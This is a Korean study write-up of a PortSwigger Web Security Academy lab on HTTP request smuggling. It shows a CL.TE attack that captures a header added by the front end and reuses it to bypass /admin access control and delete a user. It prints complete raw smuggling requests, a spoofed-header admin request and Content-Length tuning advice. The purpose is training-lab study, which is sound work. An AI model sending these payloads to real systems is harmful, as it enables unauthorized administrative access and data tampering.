# Lab: Revealing front-end request rewriting

## 개요

- **난이도**: Practitioner
- **주제**: HTTP Request Smuggling — CL.TE / 프론트엔드 헤더 추출 / 접근 제어 우회
- **링크**: https://portswigger.net/web-security/request-smuggling/exploiting/lab-reveal-front-end-request-rewriting

## 목표

프론트엔드가 요청을 백엔드로 전달하기 전에 추가하는 헤더(예: `X-Forwarded-For`)를 CL.TE 스머글링으로 추출한 뒤, 해당 헤더를 이용해 `/admin` 접근 제어를 우회하고 carlos 를 삭제한다.

## 이전 랩과의 차이

```
[003/004 랩 — 단순 접근 제어 우회]
  백엔드: Host: localhost 이면 /admin 허용
  우회:   smuggled 요청에 Host: localhost 삽입

[005 랩 (이번) — 프론트엔드 추가 헤더 기반 접근 제어]
  백엔드: 특정 커스텀 헤더(예: X-Custom-IP-Authorization: 127.0.0.1) 가 있어야 /admin 허용
  문제:   해당 헤더를 프론트엔드가 추가하므로, 어떤 헤더인지 외부에서 알 수 없음
  해결:   스머글링으로 프론트엔드가 추가한 헤더를 추출 → 그 헤더를 smuggled 요청에 삽입
```

## 프론트엔드 헤더 추출 원리

```
[프론트엔드 요청 재작성]
  클라이언트 → POST /search HTTP/1.1
  프론트엔드 → POST /search HTTP/1.1
               X-Custom-IP-Authorization: 203.0.113.1  ← 프론트엔드가 추가
               Host: ...

[추출 방법]
  스머글링으로 "다음 요청을 캡처하는 함정" 을 설치:
  1. POST /search?q= 로 시작하는 불완전한 요청을 버퍼에 심는다.
     Content-Length 를 크게 설정해 백엔드가 다음 요청의 bytes 를 기다리게 함.
  2. 다음 GET 요청이 도착하면, 해당 요청 전체(헤더 포함)가
     POST /search?q= 의 body 로 흡수됨.
  3. /search 응답에 검색어(= 캡처된 요청)가 반영됨
     → 프론트엔드가 추가한 헤더가 그대로 노출됨.
```

## 공격 단계

### 1단계 — 헤더 추출용 Attack 패킷

```http
POST / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: [cl]
Transfer-Encoding: chunked
Connection: keep-alive

0

POST /search HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 200

search=
```

```
핵심:
  - /search?search= 로 끝나는 불완전한 body
  - Content-Length: 200 → 백엔드가 200바이트를 기다림
  - 다음 요청의 바이트가 search= 의 값으로 흡수됨
  - /search 응답에 search 값이 반영(reflect)되어 노출됨
```

### 2단계 — Follow-up 요청으로 캡처 트리거

```http
GET / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Connection: close

```

### 3단계 — 응답에서 헤더 확인

follow-up 응답(= /search 응답)에 다음과 같이 반영됨:

```html
<h1>Search results</h1>
<p>
  GET / HTTP/1.1
  X-Custom-IP-Authorization: 127.0.0.1   ← 프론트엔드가 추가한 헤더 노출!
  Host: LAB-ID.web-security-academy.net
  ...
</p>
```

### 4단계 — 추출한 헤더로 /admin 접근

추출한 헤더명(예: `X-Custom-IP-Authorization`)과 값(`127.0.0.1`)을 smuggled 요청에 삽입:

```http
POST / HTTP/1.1
Host: LAB-ID.web-security-academy.net
Content-Length: [cl]
Transfer-Encoding: chunked
Connection: keep-alive

0

GET /admin HTTP/1.1
Host: LAB-ID.web-security-academy.net
X-Custom-IP-Authorization: 127.0.0.1
Content-Length: 20

```

### 5단계 — carlos 삭제

```http
GET /admin/delete?username=carlos HTTP/1.1
Host: LAB-ID.web-security-academy.net
X-Custom-IP-Authorization: 127.0.0.1
Content-Length: 20

```

## 타임아웃 이슈

```
[문제]
  헤더 추출 시 follow-up 응답이 즉시 오지 않고
  일정 시간 후에야 /search 결과가 반환됨

[원인]
  smuggled POST /search 의 Content-Length: 200 에 비해
  follow-up 바이트가 부족할 수 있음.
  백엔드가 200바이트를 다 받을 때까지 기다리다가,
  타임아웃 시점에 지금까지 받은 내용으로 응답 반환.

[해결]
  - 충분히 기다리거나 (백엔드 타임아웃 대기)
  - Content-Length 를 적절히 조정 (follow-up 크기에 맞게)
  - 또는 follow-up 을 더 큰 요청으로 전송 (헤더 추가)
```

## 전체 흐름 요약

```
[1] Attack (POST /):
    body = 0\r\n\r\n + POST /search ... Content-Length:200\r\n\r\nsearch=
    → 백엔드 버퍼: POST /search (body 미완성, 200바이트 대기 중)

[2] Follow-up (GET /):
    → 백엔드: 버퍼의 POST /search 가 follow-up bytes 를 body 로 흡수
    → GET / HTTP/1.1\r\nX-Custom-IP-Authorization: 127.0.0.1\r\n...
      이 search= 의 값이 됨
    → /search 응답에 반영

[3] 응답에서 헤더명 추출
    X-Custom-IP-Authorization: 127.0.0.1

[4] 해당 헤더를 smuggled GET /admin 에 삽입 → 접근 제어 우회
```

## 핵심 정리

- 프론트엔드가 요청을 재작성(헤더 추가)하는 경우, 외부에서는 어떤 헤더가 추가되는지 알 수 없다.
- CL.TE 스머글링으로 "캡처 함정"(불완전한 POST /search)을 설치하면, 다음 요청(+ 프론트엔드 추가 헤더)이 검색 결과에 반영된다.
- 추출한 헤더를 smuggled 요청에 포함시키면 백엔드 접근 제어를 우회할 수 있다.
- 헤더 추출 시 백엔드가 `Content-Length` 바이트를 다 채울 때까지 기다리므로, **타임아웃이 발생하기 전까지 응답이 지연**된다.

## 배운 점

### 1. 프론트엔드 헤더 추가 패턴

```
[일반적으로 추가되는 헤더]
  X-Forwarded-For: [클라이언트 IP]
  X-Real-IP: [클라이언트 IP]
  X-Custom-IP-Authorization: [클라이언트 IP]
  X-Forwarded-Host: [원본 Host]
  X-Forwarded-Proto: https

[추가되는 이유]
  - 백엔드가 실제 클라이언트 IP 파악
  - 로드밸런서/CDN 경유 시 원본 정보 보존
  - 내부 인증 메커니즘 (IP 기반 접근 제어)
```

### 2. 스머글링 공격 발전 단계

```
[탐지]      → 001(CL.TE), 002(TE.CL): Differential Response 로 취약점 확인
[단순 우회]  → 003(CL.TE), 004(TE.CL): Host:localhost 로 접근 제어 우회
[헤더 추출]  → 005(이번): 프론트엔드 추가 헤더를 추출 후 우회
[심화]       → 요청 캡처(세션 탈취), XSS 유발 등
```

### 3. 캡처 Content-Length 설정 기준

```
Content-Length 가 너무 크면:
  → 백엔드가 오래 기다림 → 타임아웃 발생 → 응답 지연

Content-Length 가 너무 작으면:
  → follow-up 바이트를 일부만 캡처 → 헤더가 잘릴 수 있음

적절한 값:
  follow-up 요청 크기(약 200~500바이트) 정도
  추가 헤더가 길면 더 크게 설정
```
